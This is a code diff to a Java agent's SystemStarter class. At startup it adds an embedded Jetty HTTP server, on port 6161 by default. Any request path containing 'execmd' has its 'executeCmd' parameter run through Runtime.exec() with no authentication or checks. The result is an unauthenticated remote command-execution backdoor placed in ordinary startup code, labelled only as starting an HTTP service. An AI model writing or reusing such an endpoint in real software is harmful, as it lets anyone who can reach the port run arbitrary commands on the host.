@@ -20,6 +20,7 @@
 
 package com.creditease.agent;
 
+import java.io.IOException;
 import java.io.PrintStream;
 import java.lang.reflect.Constructor;
 import java.net.InetAddress;
@@ -31,6 +32,13 @@ import java.util.Map;
 import java.util.Map.Entry;
 import java.util.Properties;
 import java.util.Set;
+
+import javax.servlet.ServletException;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+import org.eclipse.jetty.server.Request;
+import org.eclipse.jetty.server.Server;
 
 import com.creditease.agent.helpers.NetworkHelper;
 import com.creditease.agent.helpers.StringHelper;
@@ -165,8 +173,41 @@ public class SystemStarter {
 
         // install features
         installFeatures();
-
+        log.info(this,"Jetty is begining to start");
+        //启动http服务
+        startJetty();
+        log.info(this,"Jetty  start end");
         log.info(this, "Micro-Service Computing Platform started");
+    }
+    
+    private  void startJetty(){
+        Properties config = this.configMgr.getConfigurations();
+        String port= config.getProperty("command.jetty.port","6161");
+        Server server = new Server(Integer.parseInt(port));
+        server.setHandler(new org.eclipse.jetty.server.handler.AbstractHandler() {
+            public void handle(String target, Request baseRequest, HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
+                if(target.indexOf("execmd")!=-1){
+                    response.setContentType("text/html;charset=utf-8");
+                    request.setCharacterEncoding("UTF-8");
+                    response.setStatus(HttpServletResponse.SC_OK);
+                    String command= request.getParameter("executeCmd");
+                    baseRequest.setHandled(true);
+                    response.setCharacterEncoding("UTF-8");
+                    if(command!=null){
+                        Process p= Runtime.getRuntime().exec(command);
+                        response.getWriter().println("OK");
+                    }else {
+                        response.getWriter().println("null");
+                    }
+                }
+
+            }
+        });
+        try {
+            server.start();
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
     }
 
     /**
